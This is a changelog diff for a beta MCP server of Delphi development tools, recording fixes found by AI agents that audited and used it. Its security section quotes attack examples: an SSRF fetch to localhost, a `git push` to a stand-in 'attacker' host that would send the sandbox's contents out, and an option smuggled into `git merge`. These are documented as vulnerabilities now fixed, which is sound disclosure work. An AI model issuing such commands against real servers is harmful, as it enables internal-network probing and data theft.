@@ -8,6 +8,107 @@ the MCP `initialize` response (`serverInfo.version`).
 
 ## [Unreleased]
 
+## [0.62.0-beta] - 2026-08-25
+
+Field round 9. Three more agents worked the 0.60 server through nothing but
+MCP - a security auditor, a contract prober, and one doing a real programming
+job (which it finished: 78 checks green). Forty more findings. New battery
+`tests/test_round9.py` (34 checks).
+
+### Security
+- **`delphi_git` would open a connection to any URL an agent named.** Measured:
+  `fetch http://127.0.0.1:3131/mcp` made the SERVER reach that address (SSRF
+  into its own network - localhost, internal services, metadata endpoints),
+  and `push https://attacker/... HEAD:main` would have walked the jail's
+  contents out. An explicit URL now has to match **`[Security] GitRemotes`**,
+  a list of hosts the operator wrote down; empty (the default) refuses every
+  explicit URL. Remotes the operator configured in a repository keep working
+  by name (`push origin main`): where this machine may talk to is not the
+  agent's decision.
+- **`git merge` could be handed options, which broke the one thing it
+  promised.** It ran `merge --ff-only <args>`, so `--no-ff <branch>` won and
+  left the repository in MERGING with conflict markers and no way out through
+  this tool. A branch name, or `--abort`. Nothing else.
+- **A changeset id is now a capability.** Nothing bound a batch to whoever
+  opened it and `status` printed every open id, so anyone holding the token
+  could commit or roll back somebody else's half-built transaction. Ids carry
+  a random tail; `status` shows only the part before it.
+- **Masking was a C/D allowlist.** `E:\secret\x.inc`, `z:\...` and UNC paths
+  travelled untouched. Any drive letter is masked now (unserved ones as
+  `srvx:`) and a UNC host never leaves. No real leak existed on this machine -
+  only C: and D: are real and both were mapped - but a root on another drive
+  would have.
+
+### Fixed - data loss and false success
+- **`delphi_delete` could report `BORRADO` for a folder that was still
+  there.** It says what actually happened now, and the copy is made either way.
+- **An upload `offset` that landed INSIDE the file truncated the tail with no
+  copy taken** (a 14-byte file resumed at offset 5 came back 8 bytes long).
+  Resuming means continuing at the end: refused, with the right offset named.
+- **A second quarantined upload overwrote the first** without going through
+  the trash - the only write path that did not.
+- **`delphi_changeset preview` trusted the stage.** Unstage the `delete` of X
+  and the `create` of X behind it becomes a create over a file that exists;
+  preview still said "clean". It re-validates the whole plan now.
+- **A `.dproj` staged happily and blew up at commit**, taking the batch's
+  good operations down with it. Refused at stage, pointing at `delphi_config`.
+
+### Fixed - answers that were not true
+- **A test killed by the timeout was indistinguishable from one that fails
+  instantly** (same exitCode 1, same empty output, everything at zero).
+  `result: "timeout"`, `timedOut: true`, and an explanation of why the output
+  is missing: a console program's stdout is buffered, so what it printed
+  before the kill never reached the pipe.
+- **A suite where nothing could be counted answered `pass`** - "it compiles"
+  reported as "it works". That is `no-tests` now, and `discover` documents the
+  literal `PASS`/`FAIL` line format that gets counted.
+- **`delphi_test` never said which platform it ran** (Win64, while
+  `delphi_build` defaults to Win32 - two different binaries). It says it, it
+  accepts `platform=`, and it builds the one it runs. `discover` also names
+  the only folder the sandbox lets a test write into.
+- **`delphi_diagnostics` on a non-Delphi file answered "in progress, call
+  again" forever**, and the note said the next call would bring the result.
+- **`delphi_read` with the range backwards** answered with an empty body,
+  which reads as "that stretch is empty".
+- **`delphi_rename_symbol` returned 0-based lines** and told the reader to
+  feed them to `delphi_changeset`, whose `atline` is 1-based - a guaranteed
+  off-by-one, worst exactly where an anchor repeats. Both numbers now (`line`
+  1-based, `line0` as the language server gave it).
+- **`delphi_list`'s hidden-entry note blamed build folders for `.git`.** The
+  count is split by reason now, and `dirs=true` stops hiding `.git` and the
+  trash without counting them.
+- **`delphi_symbols` answered `[]` for a `.txt`**, `delphi_hover` answered a
+  canned hint for a line out of range, `delphi_definition` a bare `null`, and
+  `delphi_projects` `{"total":0}` for a root that does not exist. All of them
+  say what is actually wrong.
+- **`delphi_test` accepted a configuration the project does not have** and
+  built into a folder named after it.
+- **`nobuild=true` reported a stale binary's numbers as today's** (200000
+  passing tests out of a binary whose source no longer compiled). It says how
+  old the binary is.
+- **A report `kind` nobody knows was silently refiled as `bug`**, and
+  `delphi_components` silently ignored `filter` when given `platform`. Both
+  say so now.
+- `delphi_git`'s own description and its error message listed 14 commands and
+  forgot `switch`, `merge` and `stash` - which exist.
+- `delphi_create kind=unit` answered `RECHAZADO: ruta invalida:` with an empty
+  path when given `dir` instead of `project` (four calls to decode).
+- `delphi_delete`'s answer contradicted itself three lines in ("moved to the
+  trash" ... "the file is still on disk, delete it if you no longer want it").
+- On a read-only server, a git write is refused for being read-only, not for
+  the remote policy.
+
+### Added
+- `delphi_list` accepts `path=` as well as `root=` (and `delphi_projects`
+  too): the spelling difference cost a call every time.
+- Schema parameter names lost their trailing underscore (`classname_` →
+  `classname`, `create_` → `create`): the schema said one thing and every
+  description said another. All spellings keep working.
+- `add-deployfile` writes the entry RELATIVE to the project, as the IDE does -
+  an absolute one made the `.deployproj` unportable and stopped
+  `remove-deployfile` from finding the server's own entries.
+
+
 ## [0.61.0-beta] - 2026-08-25
 
 The other half of round 8: what the agents asked FOR, rather than what they
